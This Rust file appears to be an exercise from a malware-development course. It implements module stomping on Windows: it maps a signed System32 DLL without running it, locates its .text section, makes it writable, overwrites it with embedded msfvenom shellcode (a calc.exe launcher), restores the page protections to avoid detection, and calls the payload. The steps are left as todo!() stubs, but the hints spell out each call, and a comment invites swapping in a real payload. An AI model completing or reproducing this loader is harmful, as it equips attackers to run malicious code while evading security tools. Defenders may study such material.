use std::ffi::c_void;
use std::mem;
use windows::core::PCSTR;
use windows::Win32::System::Diagnostics::Debug::{
    IMAGE_DOS_HEADER, IMAGE_NT_HEADERS64, IMAGE_SECTION_HEADER,
};
use windows::Win32::System::LibraryLoader::{
    DONT_RESOLVE_DLL_REFERENCES, LoadLibraryExA,
};
use windows::Win32::System::Memory::{
    PAGE_EXECUTE_READ, PAGE_EXECUTE_READWRITE, PAGE_PROTECTION_FLAGS, VirtualProtect,
};

// x64 calc.exe shellcode (msfvenom -p windows/x64/exec CMD=calc.exe -f raw)
// Replace with your own shellcode for a real payload.
const SHELLCODE: &[u8] = &[
    0xfc, 0x48, 0x83, 0xe4, 0xf0, 0xe8, 0xc0, 0x00, 0x00, 0x00, 0x41, 0x51, 0x41, 0x50, 0x52,
    0x51, 0x56, 0x48, 0x31, 0xd2, 0x65, 0x48, 0x8b, 0x52, 0x60, 0x48, 0x8b, 0x52, 0x18, 0x48,
    0x8b, 0x52, 0x20, 0x48, 0x8b, 0x72, 0x50, 0x48, 0x0f, 0xb7, 0x4a, 0x4a, 0x4d, 0x31, 0xc9,
    0x48, 0x31, 0xc0, 0xac, 0x3c, 0x61, 0x7c, 0x02, 0x2c, 0x20, 0x41, 0xc1, 0xc9, 0x0d, 0x41,
    0x01, 0xc1, 0xe2, 0xed, 0x52, 0x41, 0x51, 0x48, 0x8b, 0x52, 0x20, 0x8b, 0x42, 0x3c, 0x48,
    0x01, 0xd0, 0x8b, 0x80, 0x88, 0x00, 0x00, 0x00, 0x48, 0x85, 0xc0, 0x74, 0x67, 0x48, 0x01,
    0xd0, 0x50, 0x8b, 0x48, 0x18, 0x44, 0x8b, 0x40, 0x20, 0x49, 0x01, 0xd0, 0xe3, 0x56, 0x48,
    0xff, 0xc9, 0x41, 0x8b, 0x34, 0x88, 0x48, 0x01, 0xd6, 0x4d, 0x31, 0xc9, 0x48, 0x31, 0xc0,
    0xac, 0x41, 0xc1, 0xc9, 0x0d, 0x41, 0x01, 0xc1, 0x38, 0xe0, 0x75, 0xf1, 0x4c, 0x03, 0x4c,
    0x24, 0x08, 0x45, 0x39, 0xd1, 0x75, 0xd8, 0x58, 0x44, 0x8b, 0x40, 0x24, 0x49, 0x01, 0xd0,
    0x66, 0x41, 0x8b, 0x0c, 0x48, 0x44, 0x8b, 0x40, 0x1c, 0x49, 0x01, 0xd0, 0x41, 0x8b, 0x04,
    0x88, 0x48, 0x01, 0xd0, 0x41, 0x58, 0x41, 0x58, 0x5e, 0x59, 0x5a, 0x41, 0x58, 0x41, 0x59,
    0x41, 0x5a, 0x48, 0x83, 0xec, 0x20, 0x41, 0x52, 0xff, 0xe0, 0x58, 0x41, 0x59, 0x5a, 0x48,
    0x8b, 0x12, 0xe9, 0x57, 0xff, 0xff, 0xff, 0x5d, 0x48, 0xba, 0x01, 0x00, 0x00, 0x00, 0x00,
    0x00, 0x00, 0x00, 0x48, 0x8d, 0x8d, 0x01, 0x01, 0x00, 0x00, 0x41, 0xba, 0x31, 0x8b, 0x6f,
    0x87, 0xff, 0xd5, 0xbb, 0xe0, 0x1d, 0x2a, 0x0a, 0x41, 0xba, 0xa6, 0x95, 0xbd, 0x9d, 0xff,
    0xd5, 0x48, 0x83, 0xc4, 0x28, 0x3c, 0x06, 0x7c, 0x0a, 0x80, 0xfb, 0xe0, 0x75, 0x05, 0xbb,
    0x47, 0x13, 0x72, 0x6f, 0x6a, 0x00, 0x59, 0x41, 0x89, 0xda, 0xff, 0xd5, 0x63, 0x61, 0x6c,
    0x63, 0x2e, 0x65, 0x78, 0x65, 0x00,
];

fn main() {
    unsafe {
        // Step 1 — Load a legitimate signed DLL without running its code.
        // DONT_RESOLVE_DLL_REFERENCES maps the DLL's sections into this process's
        // address space but skips DllMain and import table resolution.
        // The returned HMODULE is also the base address of the mapped image.
        //
        // Good candidates (large .text section, rarely used at runtime):
        //   C:\Windows\System32\netfxcfg.dll
        //   C:\Windows\System32\diasymreader.dll
        //   C:\Windows\System32\comsvcs.dll
        //
        // Hint: LoadLibraryExA(
        //     lplibfilename: PCSTR,   // path as a null-terminated byte string
        //     hfile: HANDLE,          // always NULL (reserved)
        //     dwflags: LOAD_LIBRARY_FLAGS, // DONT_RESOLVE_DLL_REFERENCES
        // ) -> Result<HMODULE>        // Err on failure; Ok(handle) is also the image base
        let dll_path = PCSTR(b"C:\\Windows\\System32\\netfxcfg.dll\0".as_ptr());
        let hmodule = todo!(
            "LoadLibraryExA(dll_path, None, DONT_RESOLVE_DLL_REFERENCES).expect(\"failed to load DLL\")"
        );
        let base = hmodule.0 as usize; // the DLL's base address in this process

        // Step 2 — Parse the loaded DLL's PE headers to locate the .text section.
        // The module's memory layout is a valid PE image — the same structures as in
        // modules 04 and 07. Walk DOS header → NT headers → section headers.
        //
        // Hint: cast base to *const IMAGE_DOS_HEADER to read e_lfanew,
        //       then base + e_lfanew to *const IMAGE_NT_HEADERS64,
        //       then (nt_ptr as usize + size_of::<IMAGE_NT_HEADERS64>()) to
        //       *const IMAGE_SECTION_HEADER and iterate NumberOfSections.
        //
        // A section's name is an 8-byte array: section.Name == *b".text\0\0\0"
        let dos: *const IMAGE_DOS_HEADER = todo!("cast base as *const IMAGE_DOS_HEADER");
        let nt: *const IMAGE_NT_HEADERS64 = todo!("base + (*dos).e_lfanew offset, cast to *const IMAGE_NT_HEADERS64");
        let num_sections = todo!("(*nt).FileHeader.NumberOfSections as usize");
        let sections: *const IMAGE_SECTION_HEADER = todo!(
            "(nt as usize + mem::size_of::<IMAGE_NT_HEADERS64>()) as *const IMAGE_SECTION_HEADER"
        );

        let mut text_va: usize = 0;
        let mut text_size: usize = 0;
        for i in 0..num_sections {
            let section: *const IMAGE_SECTION_HEADER = todo!("sections.add(i)");
            if (*section).Name == *b".text\0\0\0" {
                text_va   = todo!("base + (*section).VirtualAddress as usize");
                text_size = todo!("(*section).SizeOfRawData as usize");
                break;
            }
        }
        assert!(text_va != 0, ".text section not found — wrong DLL?");

        // Step 3 — Verify the shellcode fits inside the .text section.
        assert!(
            text_size >= SHELLCODE.len(),
            ".text section ({text_size} bytes) is smaller than shellcode ({} bytes); choose a bigger DLL",
            SHELLCODE.len()
        );

        // Step 4 — Remove write protection from .text so we can overwrite it.
        // .text is normally PAGE_EXECUTE_READ. We need PAGE_EXECUTE_READWRITE to write.
        //
        // Hint: VirtualProtect(
        //     lpaddress: *const c_void,        // text_va as *const c_void
        //     dwsize: usize,                   // text_size
        //     flnewprotect: PAGE_PROTECTION_FLAGS, // PAGE_EXECUTE_READWRITE
        //     lpfloldprotect: *mut PAGE_PROTECTION_FLAGS, // &mut old_protect — save for step 6
        // ) -> Result<()>
        let mut old_protect = PAGE_PROTECTION_FLAGS(0);
        todo!("VirtualProtect(text_va as *const c_void, text_size, PAGE_EXECUTE_READWRITE, &mut old_protect)");

        // Step 5 — Copy shellcode into the .text section (stomping the DLL's code).
        //
        // Hint: std::ptr::copy_nonoverlapping(
        //     src: *const u8,   // SHELLCODE.as_ptr()
        //     dst: *mut u8,     // text_va as *mut u8
        //     count: usize,     // SHELLCODE.len()
        // )
        todo!("ptr::copy_nonoverlapping to write SHELLCODE bytes into text_va");

        // Step 6 — Restore the original memory protection.
        // Leaving .text as RWX is itself a detection signal; put it back to RX.
        //
        // Hint: VirtualProtect(text_va, text_size, old_protect, &mut dummy)
        let mut dummy = PAGE_PROTECTION_FLAGS(0);
        todo!("VirtualProtect(text_va as *const c_void, text_size, old_protect, &mut dummy)");

        // Step 7 — Execute the shellcode by calling into the stomped .text section.
        // The shellcode now lives inside a signed DLL's executable region.
        //
        // Hint: transmute text_va to an `unsafe extern "system" fn()` and call it.
        let shellcode_fn: unsafe extern "system" fn() = todo!(
            "mem::transmute(text_va as *const ())"
        );
        shellcode_fn();
    }
}
